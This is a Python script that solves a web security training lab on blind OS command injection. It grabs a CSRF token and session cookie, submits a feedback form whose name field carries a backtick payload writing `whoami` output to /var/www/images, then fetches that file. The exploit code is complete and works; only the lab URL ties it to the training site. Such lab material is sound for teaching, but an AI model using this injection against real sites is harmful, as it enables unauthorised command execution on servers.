###############################################################################
#
# Lab: Blind OS command injection with output redirection
#
# Hack Steps: 
#      1. Fetch the feedback page
#      2. Extract the csrf token and session cookie
#      3. Inject payload into the name field when submitting a feedback to
#         execute the `whoami` command and redirect the output to a text file
#         in a writable directory
#      4. Read the new created file
#
###############################################################################
import requests
from colorama import Fore
import re

# Change this to your lab URL
LAB_URL = "https://0aa000c303c621e9870056e0000d00ab.web-security-academy.net"

def main():
    print("⦗#⦘ Injection point: " + Fore.YELLOW + "name")
    print(Fore.WHITE + "⦗1⦘ Fetching the feedback page.. ", end="", flush=True)

    feedback_page = fetch("/feedback")   

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗2⦘ Extracting the csrf token and session cookie.. ", end="", flush=True)

    session = feedback_page.cookies.get("session")
    csrf_token = re.findall("csrf.+value=\"(.+)\"", feedback_page.text)[0]
    file_name = "whoami.txt" # You can change this to what you want

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗3⦘ Injecting payload to execute the `whoami` command and redirect the output to " + 
          Fore.YELLOW + file_name + Fore.WHITE + ".. " , end="", flush=True)
   
    payload = f"`whoami>/var/www/images/{file_name}`"
    cookies ={ "session": session }
    data = { "csrf": csrf_token, "name": payload, "email": "no@hack.com", "subject": "hacking", "message": "you are hacked" }
    post_data("/feedback/submit", data, cookies)
   
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + f"⦗4⦘ Reading {file_name}.txt.. ", end="", flush=True)

    created_file = fetch(f"/image?filename={file_name}")
    whoami_output = created_file.text

    print(Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + whoami_output)
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


def fetch(path):
    try:  
        return requests.get(f"{LAB_URL}{path}", allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch " + path + " through exception")
        exit(1)


def post_data(path, data, cookies):
    try:    
        return requests.post(f"{LAB_URL}{path}", data, cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to post data to " + path + " through exception")
        exit(1)


if __name__ == "__main__":
    main()
